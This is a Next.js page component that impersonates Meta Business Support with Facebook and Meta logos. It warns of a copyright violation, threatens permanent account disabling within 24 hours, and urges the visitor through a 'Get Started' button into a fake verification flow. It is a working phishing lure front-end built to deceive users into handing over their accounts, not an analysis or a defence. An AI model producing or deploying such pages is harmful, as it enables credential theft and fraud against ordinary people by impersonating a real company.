import Image from 'next/image'
import Link from 'next/link'
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"

export default function Home() {
  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="w-full bg-white shadow-sm">
        <div className="container mx-auto px-4 py-2">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-KMqynDXovAOlAsLRmAjbWZSJw8Ogbj.png"
            alt="Facebook Logo"
            width={40}
            height={40}
          />
        </div>
      </header>

      <main className="flex-grow flex items-center justify-center py-8">
        <div className="w-full max-w-md px-4">
          <Card className="w-full">
            <CardContent className="p-6">
              <h2 className="text-xl font-semibold mb-4">Account will be restricted for 30 days</h2>
              <p className="mb-4 text-sm">
                Your account or the page you use has violated copyright. We will immediately
                limit your account or permanently disable it for non-compliance with our
                terms of service.
              </p>
              <p className="mb-4 text-sm">
                If you think we&apos;ve accidentally suspended your account, you have <span className="font-semibold">24 hours</span>
                &nbsp;to verify your account. If you miss this security notification, your account will
                be permanently disabled.
              </p>


              <div className="flex items-center mb-4 border border-gray-300 rounded-md p-4">
                <div className="border border-gray-300 rounded-full p-1 mr-3">
                  <Image
                      src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-Dj4LrMahgrJdGkyNA3mcEyuumKG8GC.png"
                      alt="Meta Logo"
                      width={28}
                      height={28}
                      className="rounded-full"
                  />
                </div>
                <span className="font-semibold text-base">Meta Business Support</span>
              </div>
              <p className="mb-4 text-sm">
                Please submit your account for review in order to avoid deactivation.
              </p>
              <Link href="/loading" className="block">
                <Button
                    className="w-full bg-[#1a73e8] hover:bg-[#1a73e8]/90 text-white font-semibold py-2.5 px-4 text-base">
                  Get Started
                </Button>
              </Link>
            </CardContent>
          </Card>
          <div className="mt-4 text-center text-xs text-gray-500">
            Meta © 2024
          </div>
        </div>
      </main>
    </div>
  )
}